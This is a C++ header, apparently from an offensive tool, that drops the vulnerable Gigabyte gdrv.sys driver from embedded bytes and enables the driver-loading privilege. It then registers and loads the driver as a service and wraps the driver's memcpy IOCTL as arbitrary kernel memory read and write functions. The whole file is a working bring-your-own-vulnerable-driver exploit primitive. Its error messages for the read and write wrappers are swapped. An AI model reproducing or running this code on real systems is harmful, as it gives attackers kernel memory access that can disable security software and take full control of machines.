#pragma once
#include "../global.h"
#include "../binary/dropper.h"
#include <devioctl.h>
#include "../utils/PrivilegeGuard.h"
#include "../utils/services.h"

// Gigabyte GIO device name and type, and IOCTL code for memcpy call
#define GIO_DEVICE_NAME				L"\\Device\\GIO"
#define FILE_DEVICE_GIO				(0xc350)
#define IOCTL_GIO_MEMCPY			CTL_CODE(FILE_DEVICE_GIO, 0xa02, METHOD_BUFFERED, FILE_ANY_ACCESS)

class PrivilegeGuard;

// Input struct for IOCTL_GIO_MEMCPY
typedef struct _GIOMemcpyInput
{
    ULONG_PTR Dst;
    ULONG_PTR Src;
    ULONG Size;
} GIOMemcpyInput, *PGIOMemcpyInput;

class GIODriver
{
public:
    GIODriver()
    {
        Initialize();
    }

    ~GIODriver()
    {
        if (_deviceHandle)
        {
            Log("Closing the driver\n");
            NtClose(_deviceHandle);
        }

        Log("Unloading the driver %ls\n", _loaderServiceName);
        UnloadDriver(_loaderServiceName);
        Log("Removing the service %ls\n", _loaderServiceName);
        DeleteService(_loaderServiceName);

        if (_loadDriverPrivilege)
        {
            Log("Disabling SE_LOAD_DRIVER_PRIVILEGE\n");
            _loadDriverPrivilege.reset();
        }

        if (_cleanup)
        {
            Log("Removing driver file %ls\n", _loaderName);
            _cleanup.reset();
        }
    }

    NTSTATUS Status() const { return _status; }

    HANDLE Handle() const { return _deviceHandle; }

    bool IsAvailable() const { return NT_SUCCESS(_status) && _deviceHandle != nullptr; }

    NTSTATUS WriteMemory(
        _In_ PVOID remoteAddress,
        _In_reads_bytes_(Size) PVOID localBuffer,
        _In_ const ULONG size
    ) const
    {
        Log(L"WriteMemory @ 0x%llX (local buffer 0x%llX), size: %lu\n",
            remoteAddress,
            localBuffer,
            size);

        if (!remoteAddress || !localBuffer || size == 0)
        {
            return STATUS_INVALID_PARAMETER;
        }

        if (!IsAvailable())
        {
            return STATUS_DEVICE_NOT_READY;
        }

        // Ensure caller's buffer is safe to read
        __try
        {
            volatile UCHAR test = *((volatile UCHAR*)localBuffer);
            (void)test;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            return STATUS_ACCESS_VIOLATION;
        }

        NTSTATUS status;
        __try
        {
            GIOMemcpyInput Input = {
                .Dst = reinterpret_cast<ULONG_PTR>(remoteAddress),
                .Src = reinterpret_cast<ULONG_PTR>(localBuffer),
                .Size = size
            };

            IO_STATUS_BLOCK IoStatus = {};
            status = NtDeviceIoControlFile(_deviceHandle,
                                           nullptr, nullptr, nullptr,
                                           &IoStatus,
                                           IOCTL_GIO_MEMCPY,
                                           &Input, sizeof(Input),
                                           nullptr, 0);
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            status = STATUS_DRIVER_INTERNAL_ERROR;
        }

        return status;
    }

    NTSTATUS ReadMemory(
        _In_ PVOID remoteAddress,
        _Out_writes_bytes_(Size) PVOID localBuffer,
        _In_ const ULONG size
    ) const
    {
        Log(L"ReadMemory @ 0x%llX (local buffer 0x%llX), size: %lu\n",
            remoteAddress,
            localBuffer,
            size);

        if (!remoteAddress || !localBuffer || size == 0)
        {
            return STATUS_INVALID_PARAMETER;
        }

        if (!IsAvailable())
        {
            return STATUS_DEVICE_NOT_READY;
        }

        __try
        {
            volatile UCHAR test = *((volatile UCHAR*)localBuffer);
            (void)test;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            return STATUS_ACCESS_VIOLATION;
        }

        NTSTATUS status;
        __try
        {
            GIOMemcpyInput Input = {
                .Dst = reinterpret_cast<ULONG_PTR>(localBuffer),
                .Src = reinterpret_cast<ULONG_PTR>(remoteAddress),
                .Size = size
            };

            IO_STATUS_BLOCK IoStatus = {};
            status = NtDeviceIoControlFile(_deviceHandle,
                                           nullptr, nullptr, nullptr,
                                           &IoStatus,
                                           IOCTL_GIO_MEMCPY,
                                           &Input, sizeof(Input),
                                           nullptr, 0);
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            status = STATUS_DRIVER_INTERNAL_ERROR;
        }
        return status;
    }

private:
    const wchar_t* DefaultGdrvDriverPath = L"C:\\Windows\\System32\\Drivers\\gdrv.sys";
    HANDLE _deviceHandle = nullptr;
    WCHAR _loaderServiceName[MAX_PATH];
    NTSTATUS _status = STATUS_UNSUCCESSFUL;
    PWCHAR _loaderName = const_cast<PWCHAR>(DefaultGdrvDriverPath);
    std::unique_ptr<TempFileGuard> _cleanup = nullptr;
    std::unique_ptr<PrivilegeGuard> _loadDriverPrivilege = nullptr;

    void Initialize()
    {
        WCHAR loaderPath[MAX_PATH];

        Log("Opening the driver\n");
        _status = OpenDeviceHandle(&_deviceHandle, FALSE);
        if (NT_SUCCESS(_status))
        {
            Log("GIO driver seem to be already working fine - re-using it.\n");
            return;
        }

        _status = RtlGetFullPathName_UEx(_loaderName, MAX_PATH * sizeof(WCHAR), loaderPath, nullptr, nullptr);
        if (!NT_SUCCESS(_status))
        {
            Log("FATAL: Failed to expand loader name into loader path, Name: %ls.\n", _loaderName);
            return;
        }

        Log(L"Resolved loader path, Name: %ls => FullPath: %ls\n", _loaderName, loaderPath);

        _cleanup = DropDriverFile(loaderPath);
        if (!CheckFileExists(loaderPath))
        {
            Log("FATAL: Failed to find driver file @ %ls.\n", loaderPath);
            return;
        }

        Log("Enabling SE_LOAD_DRIVER_PRIVILEGE\n");
        _loadDriverPrivilege = EnableLoadDriverPrivilege();
        _status = _loadDriverPrivilege->Status();
        if (!NT_SUCCESS(_status))
        {
            Log("FATAL: Failed to acquire SE_LOAD_DRIVER_PRIVILEGE. Make sure you are running as administrator.\n");
            return;
        }

        _status = GerOrCreateDriverService(_loaderServiceName, loaderPath);
        if (!NT_SUCCESS(_status))
        {
            Log(L"FATAL: Could not create driver service, serviceName: %ls, loaderPath: %ls\n", _loaderServiceName,
                loaderPath);
            return;
        }

        Log(L"Loading driver service %ls\n", _loaderServiceName);
        _status = LoadDriver(_loaderServiceName);
        if (!NT_SUCCESS(_status))
        {
            Log(L"FATAL: Could not load the driver, serviceName: %ls.\n", _loaderServiceName);
            return;
        }

        _status = OpenDeviceHandle(&_deviceHandle, TRUE);
        if (!NT_SUCCESS(_status))
        {
            Log(L"FATAL: Driver service %ls loaded but device could not be opened.\n", _loaderServiceName);
            _deviceHandle = nullptr;
        }

        Log(L"Driver is opened\n");
    }

    static NTSTATUS OpenDeviceHandle(
        _Out_ PHANDLE DeviceHandle,
        _In_ BOOLEAN PrintErrors
    )
    {
        UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(GIO_DEVICE_NAME);
        OBJECT_ATTRIBUTES ObjectAttributes = RTL_CONSTANT_OBJECT_ATTRIBUTES(&DeviceName, OBJ_CASE_INSENSITIVE);
        IO_STATUS_BLOCK IoStatusBlock;

        const NTSTATUS Status = NtCreateFile(DeviceHandle,
                                             SYNCHRONIZE,
                                             // Yes, these really are the only access rights needed. (actually would be 0, but we want SYNCHRONIZE to wait on NtDeviceIoControlFile)
                                             &ObjectAttributes,
                                             &IoStatusBlock,
                                             nullptr,
                                             FILE_ATTRIBUTE_NORMAL,
                                             FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                                             FILE_OPEN,
                                             FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
                                             nullptr,
                                             0);

        if (!NT_SUCCESS(Status) && PrintErrors) // The first open is expected to fail; don't spam the user about it
            Log("Failed to obtain handle to device %wZ: NtCreateFile: %08X.\n", &DeviceName, Status);

        return Status;
    }

    static std::unique_ptr<TempFileGuard> DropDriverFile(_In_ PWCHAR path)
    {
        if (!CheckFileExists(path))
        {
            Log(L"Driver not found at %ls. Dropping it from memory...\n", path);

            if (!DropDriverFromBytes(path))
            {
                Log(L"FATAL: Failed to drop driver to %ls\n", path);
                return nullptr;
            }

            return std::make_unique<TempFileGuard>(path);
        }
        else
        {
            Log(L"Driver is already on the disk - probably been there before us @ %ls\n", path);
            return nullptr;
        }
    }

    static bool CheckFileExists(_In_ PWCHAR LoaderPath)
    {
        WIN32_FILE_ATTRIBUTE_DATA fileInfo = {0};

        // Check if loader file exists and get its size
        if (!GetFileAttributesExW(LoaderPath, GetFileExInfoStandard, &fileInfo))
        {
            return false;
        }
        return true;
    }
};

static
NTSTATUS WriteMemory(
    _In_ const PVOID remoteAddress,
    _In_reads_bytes_(Size) const PVOID localBuffer,
    _In_ const ULONG size
)
{
    const GIODriver driver;
    NTSTATUS status = driver.WriteMemory(remoteAddress, localBuffer, size);
    if (!NT_SUCCESS(status))
    {
        Log(L"FATAL: Read operation failed @ 0x%8X (local buffer 0x%8X), size: %d: %d\n", remoteAddress, localBuffer,
            size, status);
    }
    return status;
}

static
NTSTATUS ReadMemory(
    _In_ const PVOID remoteAddress,
    _Out_writes_bytes_(Size) const PVOID localBuffer,
    _In_ const ULONG size
)
{
    const GIODriver driver;
    NTSTATUS status = driver.ReadMemory(remoteAddress, localBuffer, size);
    if (!NT_SUCCESS(status))
    {
        Log(L"FATAL: Write operation failed @ 0x%8X (local buffer 0x%8X), size: %d: %d\n", remoteAddress, localBuffer,
            size, status);
    }
    return status;
}
